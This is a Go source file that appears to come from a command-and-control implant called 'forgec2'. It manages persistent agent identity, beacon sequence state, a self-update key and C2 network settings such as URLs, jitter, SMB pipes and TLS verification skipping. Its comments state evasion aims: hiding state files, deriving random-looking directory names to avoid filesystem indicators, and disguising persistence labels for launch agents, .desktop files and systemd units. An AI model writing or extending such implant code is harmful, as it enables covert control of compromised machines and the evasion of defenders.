package main

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
)

func registerOrGetUUID() string {
	uuidFile := getUUIDFilePath()
	if data, err := os.ReadFile(uuidFile); err == nil && len(data) > 0 {
		return strings.TrimSpace(string(data))
	}
	// Generate new using crypto/rand (RFC 4122 compliant)
	var buf [16]byte
	if _, err := rand.Read(buf[:]); err == nil {
		buf[6] = (buf[6] & 0x0f) | 0x40 // version 4
		buf[8] = (buf[8] & 0x3f) | 0x80 // variant 10
		newUUID := fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
			buf[0:4], buf[4:6], buf[6:8], buf[8:10], buf[10:16])
		os.WriteFile(uuidFile, []byte(newUUID), 0o600)
		if runtime.GOOS == "windows" {
			setHidden(uuidFile)
		}
		return newUUID
	}
	// Fallback (should never happen)
	newUUID := fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
		rng.Uint32(), rng.Uint32()&0xffff, rng.Uint32()&0xffff|0x4000,
		rng.Uint32()&0x3fff|0x8000, rng.Uint64())
	os.WriteFile(uuidFile, []byte(newUUID), 0o600)
	if runtime.GOOS == "windows" {
		setHidden(uuidFile)
	}
	return newUUID
}

// getUUIDFilePath returns a dedicated, agent-private path for UUID persistence.
// It MUST NOT reuse or overwrite system files (e.g. /var/lib/dbus/machine-id or
// the cfprefs plist): doing so corrupts host services and makes the agent UUID
// predictable. The UUID lives in a hidden subdirectory of the user cache dir.
func getUUIDFilePath() string {
	base, err := os.UserCacheDir()
	if err != nil || base == "" {
		if runtime.GOOS == "windows" {
			base = os.Getenv("LOCALAPPDATA")
		} else {
			base = os.Getenv("HOME")
		}
		if base == "" {
			base = "."
		}
	}
	dir := agentStateDir(base)
	_ = os.MkdirAll(dir, 0o700)
	return filepath.Join(dir, "agent.uuid")
}

// agentStateDir returns a per-implant, non-default data directory name. The
// static ".forgec2" name is a trivial filesystem IOC; instead we derive a
// stable, unpredictable directory from the injected registration secret (or,
// as a fallback, other compile-time injected constants) so different implants
// use different directory names while remaining stable across restarts.
func agentStateDir(base string) string {
	seed := RegSecretStr
	if seed == "" {
		seed = C2URL + UserAgent + BeaconURI
	}
	sum := sha256.Sum256([]byte(seed))
	return filepath.Join(base, "."+hex.EncodeToString(sum[:])[:12])
}

// sanitizeLabel returns a filesystem/label-safe identifier derived from s by
// replacing any run of characters outside [A-Za-z0-9._-] with a single dot. It
// is used to turn the operator-controlled persistence prefix into valid plist
// labels, .desktop filenames and systemd unit names without shipping "forgec2".
func sanitizeLabel(s string) string {
	var b strings.Builder
	prevDot := false
	for _, r := range s {
		if (r >= 'A' && r <= 'Z') || (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') || r == '.' || r == '_' || r == '-' {
			b.WriteRune(r)
			prevDot = false
		} else if !prevDot {
			b.WriteRune('.')
			prevDot = true
		}
	}
	out := b.String()
	if out == "" || out == "." {
		out = "agent"
	}
	return out
}

// getBeaconStateFilePath returns the persistence path for v2 protocol state
// (frame sequence, registration marker), stored alongside the identity key.
func getBeaconStateFilePath(name string) string {
	return filepath.Join(filepath.Dir(getUUIDFilePath()), name)
}

// loadBeaconState restores the persisted frame sequence and registration
// marker. The sequence must never go backwards or the server (which persists
// last_seq) would reject our frames as replays.
func loadBeaconState() {
	seqMu.Lock()
	defer seqMu.Unlock()
	if data, err := os.ReadFile(getBeaconStateFilePath("beacon.seq")); err == nil {
		if v, err := strconv.ParseUint(strings.TrimSpace(string(data)), 10, 64); err == nil {
			beaconSeq = v
		}
	}
	if data, err := os.ReadFile(getBeaconStateFilePath("registered")); err == nil {
		registered = strings.TrimSpace(string(data)) == "1"
	}
	// Update trust root: delivered once over the encrypted session via
	// config_push and persisted so self_update keeps verifying across restarts.
	if data, err := os.ReadFile(getBeaconStateFilePath("update.key")); err == nil {
		if k := strings.TrimSpace(string(data)); len(k) == 64 {
			updatePinnedPubKeyHex = k
		}
	}
}

// persistUpdatePubKey stores the pinned update public key next to the other
// beacon state, hidden on Windows like its siblings.
func persistUpdatePubKey(keyHex string) {
	path := getBeaconStateFilePath("update.key")
	if err := os.WriteFile(path, []byte(keyHex), 0600); err == nil && runtime.GOOS == "windows" {
		setHidden(path)
	}
}

// persistBeaconState saves the current frame sequence and registration marker.
func persistBeaconState() {
	seqMu.Lock()
	seq := beaconSeq
	reg := registered
	seqMu.Unlock()
	path := getBeaconStateFilePath("beacon.seq")
	if err := os.WriteFile(path, []byte(strconv.FormatUint(seq, 10)), 0600); err == nil && runtime.GOOS == "windows" {
		setHidden(path)
	}
	if reg {
		rp := getBeaconStateFilePath("registered")
		if err := os.WriteFile(rp, []byte("1"), 0600); err == nil && runtime.GOOS == "windows" {
			setHidden(rp)
		}
	}
}

// reparseNetworkConfig re-derives the network-relevant runtime globals from the
// current *Str values. It is called after a server-delivered network config
// (config-over-wire) is applied so the changes take effect immediately. It only
// touches the network globals — EDR/SSH/mTLS init is not delivered dynamically
// and is intentionally left untouched.
func reparseNetworkConfig() {
	parts := strings.Split(C2URL, ",")
	urls := make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p != "" {
			urls = append(urls, p)
		}
	}
	if len(urls) == 0 {
		urls = []string{C2URL}
	}
	c2URLsStore(urls, 0)
	var err error
	Interval, err = strconv.Atoi(IntervalStr)
	if err != nil || Interval < 1 {
		Interval = 10
	}
	Jitter, err = strconv.Atoi(JitterStr)
	if err != nil {
		Jitter = 20
	}
	if Jitter < 0 {
		Jitter = 0
	}
	if Jitter > 100 {
		Jitter = 100
	}
	SkipTLSVerify = strings.ToLower(SkipTLSVerifyStr) == "true" || SkipTLSVerifyStr == "1"
	BeaconURI = BeaconURIStr
	if BeaconURI == "" {
		BeaconURI = "/collect"
	}
	bt := BeaconTransportStr
	if bt == "" {
		bt = "http"
	}
	setBeaconTransport(bt)
	if id, perr := strconv.ParseUint(ListenerIDStr, 10, 32); perr == nil {
		ListenerID = uint(id)
	}
	smbPipeName = SMBPipeName
	if smbPipeName == "" {
		if getProtocol() == "smb" || strings.HasPrefix(C2URL, "smb://") {
			smbPipeName = strings.TrimPrefix(C2URL, "smb://")
		}
	}
}

// nextBeaconSeq allocates the next frame sequence number.
func nextBeaconSeq() uint64 {
	seqMu.Lock()
	defer seqMu.Unlock()
	beaconSeq++
	return beaconSeq
}
